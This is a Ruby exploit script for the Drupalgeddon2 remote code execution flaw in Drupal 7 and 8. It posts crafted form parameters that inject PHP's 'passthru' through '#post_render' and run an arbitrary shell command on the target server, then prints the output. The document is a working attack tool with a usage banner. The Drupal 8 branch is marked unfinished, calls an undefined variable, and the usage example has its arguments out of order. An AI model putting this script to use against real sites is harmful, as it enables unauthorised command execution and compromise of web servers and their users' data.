#!/usr/bin/env ruby

# This version works both Drupal 8.X and Drupal 7.X

require 'base64'
require 'json'
require 'net/http'
require 'openssl'

class Target

	# host = Host URL -> http://example.com
	# PHP method to use, by default passtrhu	
	# command = Command to execute

	def initialize(host,command,php_method='passthru')
		@host = host
		@method = php_method
		@command = command
		@uri = URI(host)

		@http = create_http
	end

	def success
		puts "[+] Target seems to be exploitable! w00hooOO!"
	end

	def failed(msg)
		puts "[!] Target does NOT seem to be exploitable: " + msg
		exit
	end

	def create_http
		http = Net::HTTP.new(@uri.host, @uri.port)
		# Use SSL/TLS if needed
		if @uri.scheme == 'https'
		  http.use_ssl = true
		  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
		end

		return http
	end

	def check_response(response)
		if response.code == "200"
			success		
  		else 
  			failed("Response: " + response.code)
  		end
	end

end

class Drupal8 < Target
	def initialize(host,command,php_method='passthru')
		super(host,command,php_method)
	end

	# Not finished yet
	def exploit

		# Make the request
		req = Net::HTTP::Post.new(URI.encode("/user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax"))
		req.body = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + @method + "&mail[a][#type]=markup&mail[a][#markup]=" + @command

		response = http.request(req)
		check_response(response)
		puts response.body

	end
end

class Drupal7 < Target
	def initialize(host,command,php_method='passthru')
		super(host,command,php_method)
	end

	def exploit
		
		req = Net::HTTP::Post.new(URI.encode("/?q=user/password&name[#post_render][]=#{@method}&name[#markup]=#{@command}&name[#type]=markup"))
		req.body = 'form_id=user_pass&_triggering_element_name=name'

		response = @http.request(req)

  		form_build_id = /<input type="hidden" name="form_build_id" value="([^"]+)" \/>/.match(response.body)[1]
  		post_parameters = "form_build_id=#{form_build_id}"

		req = Net::HTTP::Post.new(URI.encode("/?q=file/ajax/name/#value/#{form_build_id}"))
		req.body = post_parameters

		response = @http.request(req)

		if response.body.split('[{"command"')[0] == ""
			if(@command != 'id')
				failed("Maybe incorrect input command, try simple command as 'id'")
			end
				failed("")
		end

		success
		puts response.body.split('[{"command"')[0]
	end
end


# Quick how to use
if ARGV.empty? || ARGV.length < 2
  puts "Usage: ruby drupalggedon2.rb <target> <version [7,8]> <command>"
  puts "       ruby drupalgeddon2.rb 7 https://example.com whoami"
  exit
end

# Read in values
target = ARGV[0]
version = ARGV[1]
command = ARGV[2]

if version == "7"
	drupal = Drupal7.new(target,command)
else
	drupal = Drupal8.new(target,command)
end

drupal.exploit